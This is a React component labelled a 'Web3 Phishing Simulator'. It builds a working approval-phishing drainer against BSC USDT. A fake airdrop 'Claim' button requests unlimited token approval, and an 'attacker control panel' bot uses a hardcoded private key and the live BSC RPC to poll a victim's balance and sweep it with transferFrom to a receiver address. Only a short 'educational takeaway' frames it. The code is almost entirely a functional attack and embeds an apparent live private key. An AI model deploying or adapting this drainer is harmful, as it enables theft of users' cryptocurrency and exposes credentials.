"use client";

import React, { useState } from 'react';
import { ethers } from 'ethers';

const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)"
];

const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

export default function PhishingDemo() {
  const [logs, setLogs] = useState<string[]>([]);
  const [isMonitoring, setIsMonitoring] = useState(false);
  const [targetAmount, setTargetAmount] = useState<string>("10");
  
  // These would usually be dynamic or env variables
  const ADMIN_PRIVATE_KEY = "e99f0eb86cf5019bab2f0d0564f89f13e5bb37e34f7ba635390e2e591c8c0271"; 
  const RECEIVER_ADDRESS = "0xC0b4cE03Df84765aE604F239Ea4BBc5731F308aF";

  const addLog = (msg: string) => {
    setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev.slice(0, 10)]);
  };

  // --- VICTIM SIDE: The "Trap" ---
  async function simulateVictimApproval() {
    try {
      if (!(window as any).ethereum) return alert("Install MetaMask");
      const provider = new ethers.providers.Web3Provider((window as any).ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = provider.getSigner();
      const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);

      addLog("Victim: Attempting to 'Claim Airdrop'...");
      
      // Requesting Unlimited Approval (The Phish)
      const tx = await contract.approve(
        "ADMIN_WALLET_ADDRESS_HERE", // The address linked to the Admin Private Key
        ethers.constants.MaxUint256
      );
      addLog(`Victim: Approval transaction sent! Hash: ${tx.hash.slice(0,10)}...`);
      await tx.wait();
      addLog("Victim: Unlimited Approval Granted to Attacker.");
    } catch (err: any) {
      addLog(`Victim Error: ${err.message.slice(0, 50)}`);
    }
  }

  // --- ATTACKER SIDE: The Sweeper ---
  async function startMonitoring() {
    const victimAddress = "VICTIM_WALLET_ADDRESS";

    try {
      const provider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
      const attackerWallet = new ethers.Wallet(ADMIN_PRIVATE_KEY, provider);
      const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, attackerWallet);

      setIsMonitoring(true);
      addLog("Attacker: Monitoring started...");

      const interval = setInterval(async () => {
        try {
          const balance = await contract.balanceOf(victimAddress);
          const threshold = ethers.utils.parseUnits(targetAmount, 18);

          if (balance.gte(threshold)) {
            addLog(`Target reached! ${ethers.utils.formatUnits(balance, 18)} USDT found.`);
            
            const tx = await contract.transferFrom(victimAddress, RECEIVER_ADDRESS, balance, {
              gasPrice: (await provider.getGasPrice()).mul(2)
            });

            addLog(`Sweep Executed: ${tx.hash}`);
            await tx.wait();
            addLog("Success: Funds stolen.");
            clearInterval(interval);
            setIsMonitoring(false);
          }
        } catch (err: any) {
          addLog(`Scanning for ${targetAmount} USDT...`);
        }
      }, 5000);
    } catch (err: any) {
      addLog(`Attacker Error: ${err.message}`);
    }
  }

  return (
    <div className="p-8 max-w-3xl mx-auto space-y-8">
      <h1 className="text-3xl font-bold text-red-600 border-b pb-2">Web3 Phishing Simulator</h1>

      {/* SECTION 1: THE TRAP */}
      <div className="p-6 border-2 border-dashed border-gray-300 rounded-xl">
        <h2 className="font-bold mb-2">1. The Phishing Site (Victim View)</h2>
        <p className="text-sm text-gray-500 mb-4">The victim clicks "Claim" and unknowingly signs an unlimited approval.</p>
        <button 
          onClick={simulateVictimApproval}
          className="bg-blue-600 text-white px-6 py-3 rounded-lg font-bold hover:bg-blue-700 w-full"
        >
          🎁 Claim Free 1,000 USDT Airdrop
        </button>
      </div>

      {/* SECTION 2: THE BOT */}
      <div className="p-6 bg-gray-900 text-white rounded-xl">
        <h2 className="font-bold mb-4 text-green-400">2. Attacker Control Panel</h2>
        
        <div className="flex gap-4 mb-4">
          <div className="flex-1">
            <label className="block text-xs uppercase mb-1">Min Sweep Amount (USDT)</label>
            <input 
              type="number" 
              value={targetAmount}
              onChange={(e) => setTargetAmount(e.target.value)}
              className="w-full p-2 bg-gray-800 border border-gray-700 rounded"
            />
          </div>
          <button 
            onClick={startMonitoring}
            disabled={isMonitoring}
            className="mt-5 bg-green-600 px-4 py-2 rounded font-bold disabled:opacity-50"
          >
            {isMonitoring ? "BOT ACTIVE" : "START MONITOR"}
          </button>
        </div>

        <div className="bg-black p-4 rounded h-48 overflow-y-auto font-mono text-xs text-green-500 border border-green-900">
          {logs.map((log, i) => <div key={i}>{log}</div>)}
        </div>
      </div>

      <div className="bg-yellow-50 p-4 rounded-lg border border-yellow-200">
        <h3 className="font-bold text-yellow-800 text-sm">Educational takeaway:</h3>
        <p className="text-xs text-yellow-700">
          The <strong>Approve</strong> function is the most dangerous tool in DeFi. Once a user clicks that blue button, 
          the "Admin" wallet has total control over that specific token until the approval is revoked.
        </p>
      </div>
    </div>
  );
}
